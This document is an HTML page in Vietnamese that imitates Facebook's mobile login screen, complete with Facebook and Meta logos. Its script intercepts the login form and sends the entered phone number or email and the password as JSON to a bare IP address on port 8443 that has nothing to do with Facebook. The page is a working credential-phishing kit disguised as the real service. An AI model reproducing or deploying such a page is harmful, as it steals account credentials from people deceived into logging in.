<html lang="vi">

<head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>
        Facebook Login
    </title>
    <script src="https://cdn.tailwindcss.com">
    </script>
    <link rel="stylesheet" href="./style.css">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
</head>

<body class="bg-white min-h-screen flex flex-col justify-between">
    <div class="pt-4 text-center text-sm text-[#606770] font-normal">
        Tiếng Việt
    </div>
    <div class=" iconfb">
        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" alt="">
    </div>
    <main class="flex flex-col items-center px-6 mt-10 space-y-6">
        <form id="loginForm" class="w-full max-w-sm flex flex-col space-y-4">
            <div class="entryarea">
                <input type="text" name="name" required />
                <div class="lableLine">Số điện thoại hoặc email</div>
            </div>
            <div class="entryarea">
                <input type="password" name="pass" required />
                <div class="lableLine">Mật khẩu</div>
            </div>
            <!-- <br> -->
            <div class="pp"></div>

            <button class="btn-login" type="submit">
                Đăng nhập
            </button>
        </form>
        <div class="" style="margin-top: 0;">
            Bạn quên mật khẩu ư?
        </div>
    </main>
    <footer class="mb-6 px-6 flex flex-col items-center space-y-4">
        <button class="w-full max-w-sm border border-[#1877f2] text-[#1877f2] rounded-full py-2 text-sm font-normal"
            type="button">
            Tạo tài khoản mới
        </button>
        <div class="icon-meta">
            <img alt="Meta logo" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" width="20" />
        </div>
        <div class="flex justify-center space-x-2 text-[#606770] text-[10px] font-normal">
            <a class="hover:underline" href="#">
                Giới thiệu
            </a>
            <a class="hover:underline" href="#">
                Trợ giúp
            </a>
            <a class="hover:underline" href="#">
                Xem thêm
            </a>
        </div>
    </footer>
</body>

<script>
    document.getElementById('loginForm').addEventListener('submit', function (e) {
        e.preventDefault(); // Ngăn reload trang

        const form = e.target;

        // Tạo JSON từ các trường input
        const data = {
            name: form.name.value,
            pass: form.pass.value
        };
        console.log(data)

        fetch('https://160.22.121.222:8443/api/users', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json' // Quan trọng!
            },
            body: JSON.stringify(data)
        })
            .then(res => res.json()) // hoặc .text(), tùy backend trả về
            .then(result => {
                console.log('Phản hồi từ server:', result);
                // Có thể điều hướng hoặc hiển thị thông báo
            })
            .catch(error => {
                console.error('Lỗi khi gửi dữ liệu:', error);
            });
    });
</script>

</html>
